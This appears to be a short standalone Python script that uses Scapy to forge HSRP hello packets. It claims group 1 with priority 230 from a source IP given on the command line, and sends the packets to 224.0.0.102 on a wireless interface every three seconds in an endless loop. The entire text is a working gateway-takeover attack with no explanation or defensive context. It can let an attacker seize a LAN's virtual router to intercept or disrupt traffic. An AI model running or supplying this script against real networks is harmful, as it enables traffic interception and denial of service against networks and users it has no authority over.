from scapy.all import *

ip = IP(src=sys.argv[1],dst='224.0.0.102')
udp = UDP()
hsrp = HSRP(group=1, priority=230,virtualIP='129.31.176.0')

send(ip/udp/hsrp, iface='wlan0',inter=3,loop=1)
